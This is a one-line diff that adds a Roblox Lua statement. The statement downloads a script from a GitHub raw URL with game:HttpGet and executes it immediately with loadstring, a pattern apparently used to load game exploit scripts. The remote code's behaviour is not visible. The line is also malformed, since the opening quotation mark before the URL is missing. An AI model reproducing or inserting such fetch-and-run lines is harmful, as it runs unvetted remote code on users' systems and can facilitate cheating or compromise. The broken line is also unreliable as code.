@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(https://raw.githubusercontent.com/NeonBlox/gfgdg/main/script'))()
